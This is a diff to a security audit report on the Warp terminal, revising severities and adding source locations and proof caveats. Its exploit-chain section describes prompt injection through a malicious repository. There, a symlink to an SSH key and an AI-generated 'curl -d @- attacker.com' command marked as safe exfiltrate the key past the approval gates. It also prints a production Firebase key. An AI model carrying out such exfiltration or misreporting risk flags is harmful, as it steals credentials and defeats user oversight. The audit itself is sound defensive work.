@@ -10,13 +10,13 @@
 
 **Date:** 2026-04-29
 
-**Status:** 30 Vulnerabilities Confirmed (6 Critical, 9 High, 3 Medium-High, 6 Medium, 6 Medium-Low) + 3 End-to-End Exploit Chains
+**Status:** 30 Vulnerabilities (6 Critical, 7 High, 3 Medium-High, 8 Medium, 6 Medium-Low) + 3 End-to-End Exploit Chains
 
 ---
 
 ## Executive Summary
 
-This audit identified **30 vulnerabilities** (6 Critical, 9 High, 3 Medium-High, 6 Medium, 6 Medium-Low) in the Warp terminal application across encryption, remote server, AI integration, IPC, auto-update, and supply-chain components. **3 end-to-end exploit chains** demonstrate how individual findings combine into critical attack scenarios with working proof-of-concept evidence. All findings were validated against source code at the audited commit with mechanically reproducible verification scripts.
+This audit identified **30 vulnerabilities** (6 Critical, 7 High, 3 Medium-High, 8 Medium, 6 Medium-Low) in the Warp terminal application across encryption, remote server, AI integration, IPC, auto-update, and supply-chain components. **3 end-to-end exploit chains** demonstrate how individual findings combine into critical attack scenarios with working proof-of-concept evidence. All findings were validated against source code at the audited commit with mechanically reproducible verification scripts.
 
 ## Evidence Types
 
@@ -38,12 +38,12 @@ This audit identified **30 vulnerabilities** (6 Critical, 9 High, 3 Medium-High,
 | VULN-008 | AI Self-Reports Security Flags (is_read_only/is_risky) | High | 8.1 | Confirmed | Source Code Verified |
 | VULN-023 | MCP working_directory Passed to current_dir Without Validation | High | 7.8 | Confirmed | Source Code Verified |
 | VULN-029 | AI File-Read Allowlist Symlink Bypass | High | 7.8 | Confirmed | Source Code Verified + Live Demo |
-| VULN-025 | WARP_PATH_APPEND Bootstrap Sink Without Sanitization | Medium | 6.1 | Confirmed | Source Code Verified |
+| VULN-025 | WARP_PATH_APPEND Bootstrap Sink Without Sanitization | Medium | 6.1 | Source-Level Concern | Source Code Verified |
 | VULN-005 | IPC Unbounded Memory Allocation (DoS) | High | 7.5 | Confirmed | Source Code Verified |
-| VULN-006 | Hardcoded Firebase API Key (No App Check) | High | 7.5 | Confirmed | Source Code Verified |
+| VULN-006 | Hardcoded Firebase API Key Shipped in Binary | Medium | 5.3 | Confirmed | Source Code Verified |
 | VULN-026 | MCP OAuth CSRF Token Map Unbounded Growth | High | 7.5 | Confirmed | Source Code Verified |
 | VULN-027 | ProxyInfo Debug Trait Leaks Proxy Credentials | High | 7.5 | Confirmed | Source Code Verified |
-| VULN-031 | MCP OAuth Client Secrets Embedded in Binary | High | 7.5 | Confirmed | Source Code Verified |
+| VULN-031 | MCP OAuth Client Secrets — Architecture Allows Embedding | Medium | 5.3 | Source-Level Concern | Source Code Verified |
 | VULN-007 | Node.js Download Without Integrity Verification | Medium-High | 7.1 | Confirmed | Source Code Verified |
 | VULN-009 | Shell Bootstrap Path Injection | Medium-High | 7.1 | Confirmed | Source Code Verified |
 | VULN-015 | Missing URL Scheme Validation in Markdown/HTML Links | Medium-High | 6.8 | Confirmed | Source Code Verified |
@@ -108,21 +108,25 @@ attack scenarios, demonstrating that the individual findings are not theoretical
 
 ---
 
-### CHAIN-002: AI Permission Bypass + Zero-Interaction Credential Exfiltration (VULN-004 + VULN-008 + VULN-029)
+### CHAIN-002: AI Permission Bypass + Symlink Credential Exfiltration (VULN-004 + VULN-008 + VULN-029)
 
-**Severity:** Critical (CVSS 9.0)
+**Severity:** High (CVSS 8.1)
 **Vulnerabilities:** VULN-004 (`--dangerously-skip-permissions`) + VULN-008 (AI self-report flags) + VULN-029 (Symlink bypass)
 **Exploit:** `autofyn_audit/exploits/live_demo_chain002.sh`
+
+**Preconditions:** User opens AI agent session with a malicious repository as context. The chain requires the user to initiate the agent session and the model to follow the injected prompt — it is not zero-click.
 
 **Attack flow:**
 1. Attacker creates symlink in malicious repo: `ln -s ~/.ssh/id_rsa ./.project_config`
 2. User clones repo and opens AI agent with repo context.
-3. **VULN-029:** AI requests to read `.project_config` — lexical `starts_with()` check passes
-   (symlink not resolved by `host_native_absolute_path()`). OS `open()` follows symlink to
-   `/home/user/.ssh/id_rsa`.
+3. **VULN-029:** AI requests to read `.project_config` — lexical `starts_with()` check at
+   `app/src/ai/blocklist/permissions.rs:662` passes (symlink not resolved by
+   `host_native_absolute_path()`). OS `open()` follows symlink to `/home/user/.ssh/id_rsa`.
 4. **VULN-008:** AI generates: `RunShellCommand { command: "curl -d @- attacker.com", is_read_only: true, is_risky: false }`.
-   Client trusts AI-supplied flags verbatim — auto-execution approved with no confirmation prompt.
-5. **VULN-004:** `--dangerously-skip-permissions` flag prevents any remaining approval gates.
+   Client trusts AI-supplied flags verbatim at `crates/ai/src/agent/action/convert.rs:29-30` —
+   auto-execution approved without confirmation prompt in agent-decided modes.
+5. **VULN-004:** `--dangerously-skip-permissions` flag at `app/src/ai/agent_sdk/driver/harness/claude_code.rs:175`
+   removes the downstream AI tool's own approval gate.
 6. SSH key exfiltrated to attacker server.
 
 **Confirmed output:**
@@ -433,22 +437,22 @@ echo "TERM=tmux-256color LD_LIBRARY_PATH=\"$INSTALL_PATH/lib\" ... \"$INSTALL_PA
 | **CWE** | CWE-918: Server-Side Request Forgery (SSRF) |
 
 **Description:**
-MCP SSE server configuration accepts a user-controlled URL that flows directly to `reqwest::post(url)` without any scheme or host validation. Users can add MCP servers via the Settings UI (`settings_view/mcp_servers/edit_page.rs:314`), where JSON configuration is parsed by `MCPServer::from_user_json()` (`mod.rs:523-564`) with no URL validation. The URL is stored in `ServerSentEvents { pub url: String }` and passed directly to the HTTP client at `send_initialize_request()`. MCP servers are designed to be shared and installed from external sources (tutorials, registries, shared configs), making social engineering a realistic delivery vector.
+MCP SSE server configuration accepts a user-controlled URL that flows directly to `reqwest::post(url)` without any scheme or host validation. Users can add MCP servers via the Settings UI (`app/src/settings_view/mcp_servers/edit_page.rs:879`), where JSON configuration is parsed by `MCPServer::from_user_json()` (`mod.rs:523-564`) with no URL validation. The URL is stored in `ServerSentEvents { pub url: String }` and passed directly to the HTTP client at `send_initialize_request()`. MCP servers are designed to be shared and installed from external sources (tutorials, registries, shared configs), making social engineering a realistic delivery vector.
 
 **Vulnerable Code:**
 ```rust
-// mod.rs:259-264 — raw URL stored
+// app/src/ai/mcp/mod.rs:259-264 — raw URL stored
 pub struct ServerSentEvents { pub url: String }
 
-// mod.rs:550-554 — no validation at parse time
+// app/src/ai/mcp/mod.rs:550-554 — no validation at parse time
 JSONTransportType::SSEServer { url, headers } => TransportType::ServerSentEvents(
     ServerSentEvents { url: url.to_owned(), headers: headers.to_owned() }
 )
 
-// native.rs:2068-2090 — URL sent directly to HTTP client
+// app/src/ai/mcp/templatable_manager/native.rs:2068-2090 — URL sent directly to HTTP client
 build_client_with_headers(headers)?.post(url).json(&request).send()
 
-// settings_view/mcp_servers/edit_page.rs:874-938 — Save handler spawns immediately
+// app/src/settings_view/mcp_servers/edit_page.rs:879-938 — Save handler spawns immediately
 // User pastes JSON → parsed → server created → install_from_template(start_automatically=true)
 ```
 
@@ -609,23 +613,25 @@ let mut payload_buf = vec![0; payload_len];  // No limit!
 
 ---
 
-### VULN-006: Hardcoded Firebase API Key
+### VULN-006: Hardcoded Firebase API Key Shipped in Binary
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | HIGH |
-| **CVSS 3.1** | 7.5 (High) |
+| **Severity** | MEDIUM |
+| **CVSS 3.1** | 5.3 (Medium) |
 | **File** | `crates/warp_core/src/channel/config.rs:49` |
 | **CWE** | CWE-798: Use of Hard-coded Credentials |
 
 **Description:**
-Firebase production Web API key is hardcoded in source and shipped in every binary. Note: Firebase Web API keys are designed to be included in client-side code and are not secret by themselves. However, without Firebase App Check enabled, the exposed key allows automated abuse — including account enumeration via `signInWithPassword`, credential stuffing attacks against user accounts, and unrestricted calls to Firebase Auth REST endpoints from any origin without rate limiting tied to a verified app identity.
+The production Firebase Web API key `AIzaSyBdy3O3S9hrdayLJxJ7mriBR4qgUaUygAs` is hardcoded at `crates/warp_core/src/channel/config.rs:49` and shipped in every Warp binary. Firebase Web API keys are designed to be included in client-side code and are not secret by themselves. The key allows unauthenticated calls to Firebase Auth REST endpoints (e.g., `identitytoolkit.googleapis.com`) from any origin.
+
+**What is proven:** The key is present in source at the cited line and is active (unauthenticated `accounts:createAuthUri` requests return HTTP 200). **What is not proven from this audit:** Whether App Check is absent, whether account enumeration succeeds, or whether credential stuffing is practically viable against Warp's Firebase configuration.
 
 **Exposed Key:** `AIzaSyBdy3O3S9hrdayLJxJ7mriBR4qgUaUygAs`
 
-**Impact:** Enables automated account enumeration, credential stuffing, and unrestricted Firebase Auth API abuse without App Check verification. The key itself is semi-public by Firebase's design, but the absence of App Check removes the primary mitigation.
+**Impact:** The shipped key enables direct unauthenticated calls to Firebase Auth REST endpoints. Actual abuse potential depends on server-side Firebase Security Rules and App Check configuration, which were not tested in this audit.
 
-**Remediation:** Implement Firebase App Check to restrict API usage to verified Warp app instances. Consider enabling reCAPTCHA Enterprise for auth endpoints.
+**Remediation:** Implement Firebase App Check to restrict API usage to verified Warp app instances.
 
 ---
 
@@ -695,35 +701,38 @@ pub struct ProxyInfo {
 
 ---
 
-### VULN-031: MCP OAuth Client Secrets Embedded in Binary Architecture
+### VULN-031: MCP OAuth Client Secrets — Architecture Allows Compile-Time Embedding
 
 | Attribute | Value |
 |-----------|-------|
-| **Severity** | HIGH |
-| **CVSS 3.1** | 7.5 (High) |
+| **Severity** | MEDIUM |
+| **CVSS 3.1** | 5.3 (Medium) |
 | **Files** | `crates/warp_core/src/channel/config.rs:137-144`, `app/src/bin/channel_config.rs:28-33` |
 | **CWE** | CWE-798: Use of Hard-coded Credentials |
 
 **Description:**
-The `McpOAuthProviderConfig` struct contains `client_secret: Cow<'static, str>` for OAuth providers that don't support Dynamic Client Registration (e.g., GitHub). For release builds, channel configuration JSON is embedded via `include_str!()` macro at compile time. If production builds include OAuth client secrets, they are present in every shipped binary.
+The `McpOAuthProviderConfig` struct at `crates/warp_core/src/channel/config.rs:137-144` contains `client_secret: Cow<'static, str>`. The `'static` lifetime requires compile-time values. For release builds, channel configuration JSON is embedded via `include_str!()` at `app/src/bin/channel_config.rs:28-33`. The runtime fallback path at `app/src/ai/mcp/templatable_manager/oauth.rs:324-346` uses `provider.client_secret.into_owned()` when Dynamic Client Registration fails — this code path only works if the embedded secret is non-empty. **What is proven:** The architecture is designed to embed and use OAuth client secrets at compile time. **What is not proven from this source checkout:** Whether the production config generator (accessed via private SSH key in CI) actually outputs non-empty `client_secret` values.
 
 **Vulnerable Code:**
 ```rust
-// config.rs:137-144
+// crates/warp_core/src/channel/config.rs:137-144
 pub struct McpOAuthProviderConfig {
     pub issuer: Cow<'static, str>,
     pub client_id: Cow<'static, str>,
-    pub client_secret: Cow<'static, str>,  // embedded in binary
+    pub client_secret: Cow<'static, str>,  // 'static lifetime = compile-time embedding
 }
 
-// channel_config.rs:28-33
+// app/src/bin/channel_config.rs:28-33
 #[cfg(feature = "release_bundle")]
 pub const CONFIG_JSON: &str = include_str!(concat!(env!("OUT_DIR"), "/channel_config.json"));
+
+// app/src/ai/mcp/templatable_manager/oauth.rs:338 — runtime usage as DCR fallback
+client_secret: Some(provider.client_secret.into_owned()),
 ```
 
-**Impact:** OAuth client secret exposure enabling impersonation attacks.
+**Impact:** Architectural concern. If production builds embed non-empty `client_secret` values, they are extractable from the shipped binary via `strings(1)`, enabling OAuth client impersonation.
 
-**Remediation:** Use Dynamic Client Registration where supported. For providers requiring static secrets, retrieve from secure backend at runtime rather than embedding in binary.
+**Remediation:** Use Dynamic Client Registration where supported. For providers requiring static secrets, retrieve from a secure backend at runtime rather than embedding in the binary.
 
 ---
 
